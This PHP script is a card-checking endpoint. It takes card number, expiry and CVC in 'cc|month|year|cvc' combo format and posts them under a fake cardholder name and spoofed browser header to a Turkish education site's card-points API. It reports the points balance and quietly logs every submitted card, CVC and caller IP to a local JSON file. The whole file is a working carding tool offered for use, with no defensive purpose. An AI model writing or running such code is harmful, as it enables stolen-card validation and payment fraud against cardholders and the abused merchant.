<?php
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] !== 'POST' && $_SERVER['REQUEST_METHOD'] !== 'GET') {
    http_response_code(405);
    echo json_encode(['error' => 'pipim kaşındı']);
    exit;
}

$cc = $_POST['cc'] ?? $_GET['cc'] ?? '';
if ($cc) {
    $parts = explode('|', $cc);
    if (count($parts) === 4) {
        $card_no = trim($parts[0]);
        $card_month = trim($parts[1]);
        $card_year = trim($parts[2]);
        $card_cvc = trim($parts[3]);
    } else {
        http_response_code(400);
        echo json_encode(['error' => 'örnek card: 4743401066756416|11|28|311']);
        exit;
    }
} else {
    $card_no = $_POST['card_no'] ?? '';
    $card_cvc = $_POST['card_cvc'] ?? '';
    $card_month = $_POST['card_month'] ?? '';
    $card_year = $_POST['card_year'] ?? '';
}

if (!$card_no || !$card_cvc || !$card_month || !$card_year) {
    http_response_code(400);
    echo json_encode(['error' => 'eksik parametre']);
    exit;
}

$url = 'https://www.tongucakademi.com/uyelikpaketleri/getcardpoint';
$data = [
    'KartNo' => $card_no,
    'KartAd' => 'Crawll Baba',
    'KartCvc' => $card_cvc,
    'KartAy' => $card_month,
    'KartYil' => $card_year,
    'Total' => '2249.1'
];

$options = [
    'http' => [
        'header'  => "Content-type: application/x-www-form-urlencoded\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data),
        'timeout' => 10
    ]
];
$context  = stream_context_create($options);
$result = @file_get_contents($url, false, $context);

function log_to_puan($log_entry) {
    $log_file = __DIR__ . '/puan.json';
    $logs = [];
    if (file_exists($log_file)) {
        $content = file_get_contents($log_file);
        $logs = json_decode($content, true);
        if (!is_array($logs)) $logs = [];
    }
    $logs[] = $log_entry;
    file_put_contents($log_file, json_encode($logs, JSON_PRETTY_PRINT|JSON_UNESCAPED_UNICODE));
}

$log_entry = [
    'datetime' => date('c'),
    'ip' => $_SERVER['REMOTE_ADDR'] ?? '',
    'card_no' => $card_no,
    'card_month' => $card_month,
    'card_year' => $card_year,
    'card_cvc' => $card_cvc,
    'api_response' => null
];
if ($result === FALSE) {
    $log_entry['api_response'] = 'API istegi başarısız';
    log_to_puan($log_entry);
    http_response_code(502);
    echo json_encode(['error' => 'API istegi başarısız']);
    exit;
}
$json = json_decode($result, true);
if ($json === null) {
    $log_entry['api_response'] = $result;
    log_to_puan($log_entry);
    echo json_encode([
        'card' => $cc ? $cc : $card_no . '|' . $card_month . '|' . $card_year . '|' . $card_cvc,
        'amount' => null,
        'AdditionalData' => $result,
        'author' => '@unutur'
    ]);
} else {
    $log_entry['api_response'] = $json;
    log_to_puan($log_entry);
    echo json_encode([
        'card' => $cc ? $cc : $card_no . '|' . $card_month . '|' . $card_year . '|' . $card_cvc,
        'amount' => $json['Data']['Amount'] ?? null,
        'AdditionalData' => $json['Data']['AdditionalData'] ?? null,
        'author' => '@unutur'
    ]);
}